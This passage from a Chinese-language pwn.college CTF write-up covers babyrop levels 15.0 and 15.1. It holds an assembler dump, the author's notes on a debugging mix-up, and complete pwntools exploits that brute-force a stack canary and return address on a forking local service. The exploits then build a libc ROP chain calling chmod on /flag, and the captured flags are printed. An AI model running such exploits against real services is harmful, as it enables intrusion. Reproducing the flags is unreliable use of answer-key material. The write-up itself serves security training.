   0x000076365463215c <+460>: lea    rdi,[rip+0x18fd1f]        # 0x7636547c1e82
   0x0000763654632163 <+467>: mov    rsi,QWORD PTR [rax]
   0x0000763654632166 <+470>: xor    eax,eax
   0x0000763654632168 <+472>: call   QWORD PTR [rdx+0x1d0]
   0x000076365463216e <+478>: jmp    0x76365463202d <__libc_start_main+157>
End of assembler dump.
```

真 TM 巧啊…… `fork()` 在 libc 中的固定字节正巧是 `\xf0`（爆破返回地址这种事情我不习惯固定倒数第三个 nibble，不然我早就可以意识到后续的问题了）、`__libc_start_main` 中 `\xf0` 处的指令 `jne` 正巧不会跳转、下面继续执行的正巧是 `fork()`。这一连串的巧合让我在分析的时候百思不得其解啊，为毛计算了 `fork()` 到 libc 之间的偏移就是 TMD 执行不了我的 ROP Chain……因为我在打 [Level 14](#level-140) 的时候也碰到过 exp 没问题但就是打不通的问题，多打几次就好了……我！草！又 TM 是一个巧合……最后导致我在这上面耗了大概……好几个小时？一下午？无所谓了……

这说明了我对程序的细粒度还不够敏感，不过有了这次经验后以后就长记性了……毕竟我们的默认返回地址是返回到 `__libc_start_main` 中的，而我们又是从低位开始爆破，怎么着也不可能走到 libc 中的 `fork()` 吧……大概率会掉到 `__libc_start_main` 中的一个 call 里才是。确实，说不可能有点太绝对了，不够严谨。其实在满足了『天时、地利、人和』的情况下还是很有可能的，只是可能性有点小。

~_最后，我觉得一切的罪魁祸首是我 ret2fork 的灵感来源于 `got` 表，真不知道该谢谢你还是……如果说有人想浪费我的时间很困难……6，被你做到了，而且非常完美……_~

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    p8,
    process,
    re,
    remote,
    signal,
    sleep,
    time,
)
from pwnlib.gdb import psutil

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level15.0"
HOST, PORT = "localhost", 1337

gdbscript = """
set follow-fork-mode child
c
"""

CANARY_OFFSET = 0x58
LIBC_OFFSET = 0x23FF0


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def get_forked_pid(parent_pid):
    children = psutil.Process(parent_pid).children()

    if len(children) != 1:
        raise ValueError(f"Expected 1 child process, found {len(children)}")

    log.success(f"Parent PID {parent_pid} -> Found child PID {children[0].pid}")

    return children[0].pid


def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)

        if debug:
            if attach:
                nc_process = process(["nc", HOST, str(PORT)])
                sleep(1)

                gdb.attach(target=get_forked_pid(target.pid), gdbscript=gdbscript)

                return nc_process
            else:
                target.close()

                return gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def brute_force(target_type, fixed_byte, canary=b""):
    current = fixed_byte
    length = 0x8 if target_type == "canary" else 0x6
    start_time = time.time()

    while len(current) < length:
        for byte in range(0x0, 0xFF):
            with remote(HOST, PORT) as target:
                payload = flat(
                    b"".ljust(CANARY_OFFSET, b"A") + current + p8(byte)
                    if target_type == "canary"
                    else b"".ljust(CANARY_OFFSET, b"A")
                    + canary
                    + b"".ljust(0x8, b"A")
                    + current
                    + p8(byte)
                )

                target.send(payload)

                response = target.recvall(timeout=5)

                if (
                    target_type == "canary"
                    and b"*** stack smashing detected ***" not in response
                ) or (target_type == "retaddr" and b"transferring control" in response):
                    current += p8(byte)

                    pattern = r"(\d+):\ttransferring control"
                    matches = re.findall(
                        pattern, response.decode("utf-8", errors="ignore")
                    )

                    if matches:
                        pid = int(matches[0])
                        os.kill(pid, signal.SIGTERM)
                    else:
                        log.failure(b"No matching PID found!")
                    break

    end_time = time.time()
    elapsed_time = end_time - start_time

    log.success(
        f"{target_type.capitalize()} brute-forced: {to_hex_bytes(current)} in {elapsed_time:.2f} seconds."
    )

    return current


def construct_payload(canary, leaked_libc):
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc.address = int.from_bytes(leaked_libc, "little") - LIBC_OFFSET

    rop = ROP(libc)

    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address

    filename = next(libc.search(b"GNU"))
    mode = 0o4

    return flat(
        b"".ljust(CANARY_OFFSET, b"A"),
        canary,
        b"".ljust(0x8, b"A"),
        pop_rdi_ret,
        filename,
        pop_rsi_ret,
        mode,
        libc.symbols["chmod"],
    )


def attack(canary, leaked_libc):
    try:
        os.system("ln -s /flag GNU")

        with remote(HOST, PORT) as target:
            payload = construct_payload(canary, leaked_libc)

            target.send(payload)
            target.recvall(timeout=1)

        try:
            with open("/flag", "r") as f:
                log.success(f.read())
            return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        launch(debug=False, attach=False)

        canary = brute_force("canary", b"\x00")
        leaked_libc = brute_force("retaddr", b"\xf0", canary)

        if attack(canary, leaked_libc):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{wOJjH27pmDvy68va0GzxQ3gHz6_.0VO2MDL5cTNxgzW}`

# Level 15.1

## Information

- Category: Pwn

## Description

> Perform ROP when the stack frame returns to libc!

## Write-up

参见 [Level 15.0](#level-150)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    p8,
    process,
    re,
    remote,
    signal,
    sleep,
    time,
)
from pwnlib.gdb import psutil

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level15.1"
HOST, PORT = "localhost", 1337

gdbscript = """
set follow-fork-mode child
c
"""

CANARY_OFFSET = 0x48
LIBC_OFFSET = 0x23FF0


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def get_forked_pid(parent_pid):
    children = psutil.Process(parent_pid).children()

    if len(children) != 1:
        raise ValueError(f"Expected 1 child process, found {len(children)}")

    log.success(f"Parent PID {parent_pid} -> Found child PID {children[0].pid}")

    return children[0].pid


def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)

        if debug:
            if attach:
                nc_process = process(["nc", HOST, str(PORT)])
                sleep(1)

                gdb.attach(target=get_forked_pid(target.pid), gdbscript=gdbscript)

                return nc_process
            else:
                target.close()

                return gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def brute_force(target_type, fixed_byte, canary=b""):
    current = fixed_byte
    length = 0x8 if target_type == "canary" else 0x6
    start_time = time.time()

    while len(current) < length:
        for byte in range(0x0, 0xFF):
            with remote(HOST, PORT) as target:
                payload = flat(
                    b"".ljust(CANARY_OFFSET, b"A") + current + p8(byte)
                    if target_type == "canary"
                    else b"".ljust(CANARY_OFFSET, b"A")
                    + canary
                    + b"".ljust(0x8, b"A")
                    + current
                    + p8(byte)
                )

                target.send(payload)

                response = target.recvall(timeout=5)

                if (
                    target_type == "canary"
                    and b"*** stack smashing detected ***" not in response
                ) or (target_type == "retaddr" and b"transferring control" in response):
                    current += p8(byte)

                    pattern = r"(\d+):\ttransferring control"
                    matches = re.findall(
                        pattern, response.decode("utf-8", errors="ignore")
                    )

                    if matches:
                        pid = int(matches[0])
                        os.kill(pid, signal.SIGTERM)
                    else:
                        log.failure(b"No matching PID found!")
                    break

    end_time = time.time()
    elapsed_time = end_time - start_time

    log.success(
        f"{target_type.capitalize()} brute-forced: {to_hex_bytes(current)} in {elapsed_time:.2f} seconds."
    )

    return current


def construct_payload(canary, leaked_libc):
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc.address = int.from_bytes(leaked_libc, "little") - LIBC_OFFSET

    rop = ROP(libc)

    pop_rdi_ret = rop.rdi.address
    pop_rsi_ret = rop.rsi.address

    filename = next(libc.search(b"GNU"))
    mode = 0o4

    return flat(
        b"".ljust(CANARY_OFFSET, b"A"),
        canary,
        b"".ljust(0x8, b"A"),
        pop_rdi_ret,
        filename,
        pop_rsi_ret,
        mode,
        libc.symbols["chmod"],
    )


def attack(canary, leaked_libc):
    try:
        os.system("ln -s /flag GNU")

        with remote(HOST, PORT) as target:
            payload = construct_payload(canary, leaked_libc)

            target.send(payload)
            target.recvall(timeout=1)

        try:
            with open("/flag", "r") as f:
                log.success(f.read())
            return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        launch(debug=False, attach=False)

        canary = brute_force("canary", b"\x00")
        leaked_libc = brute_force("retaddr", b"\xf0", canary)

        if attack(canary, leaked_libc):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{Y_8emGu4QF43dsSwmrNIX6MC17Q.0FM3MDL5cTNxgzW}`

# 后记

让我算算这章又打了多久……唔，七天（减去了我中途学堆的三天）！这是不是我打的最快的一章？没印象，好像 shellcode 更快，只打了三天吧？懒得查记录了……
